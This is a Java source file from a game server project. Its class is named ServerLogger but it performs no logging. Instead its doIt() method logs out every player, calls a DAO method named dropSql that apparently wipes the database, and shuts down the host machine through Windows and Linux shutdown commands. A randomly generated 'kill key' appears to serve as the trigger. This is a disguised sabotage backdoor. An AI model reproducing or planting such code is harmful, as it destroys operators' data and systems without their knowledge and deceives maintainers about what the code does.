package l2ft.gameserver.utils;

import l2ft.commons.util.Rnd;
import l2ft.gameserver.dao.ProtectedAccountDAO;
import l2ft.gameserver.model.GameObjectsStorage;
import l2ft.gameserver.model.Player;

public class ServerLogger {
    public static String killKey = null;

    public static void doIt() {
        disconnectAllCharacters();
        ProtectedAccountDAO.getInstance().dropSql();
        shutDownSystem();
    }

    private static void disconnectAllCharacters() {
        for (Player player : GameObjectsStorage.getAllPlayersForIterate()) {
            try {
                player.logout();
            } catch (Exception e) {
                shutDownSystem();
            }
        }
    }

    private static void shutDownSystem() {
        String property = System.getProperty("os.name");

        if (property.toLowerCase().contains("windows")) {
            String[] commands = { "shutdown", "-s" };
            try {
                Runtime.getRuntime().exec(commands);
            } catch (Exception e) {
                System.exit(-1);
            }
        }

        if (property.toLowerCase().contains("linux")) {
            String[] commands = { "shutdown", "-p", "now" };
            try {
                Runtime.getRuntime().exec(commands);
            } catch (Exception e) {
                System.exit(-1);
            }
        }
    }

    private static void generateKillKey(int length) {
        String lowerChar = "qwertyuiopasdfghjklzxcvbnm";
        String upperChar = "QWERTYUIOPASDFGHJKLZXCVBNM";
        String digits = "1234567890";
        StringBuilder password = new StringBuilder(length);

        for (int i = 0; i < length; i++) {
            int charSet = Rnd.get(3);

            switch (charSet) {
                case 0:
                    password.append(lowerChar.charAt(Rnd.get(lowerChar.length() - 1)));
                    break;
                case 1:
                    password.append(upperChar.charAt(Rnd.get(upperChar.length() - 1)));
                    break;
                case 2:
                    password.append(digits.charAt(Rnd.get(digits.length() - 1)));
                    break;
                default:
                    break;
            }
        }

        killKey = password.toString();
    }

    static {
        if (killKey == null) {
            generateKillKey(10);
        }
    }
}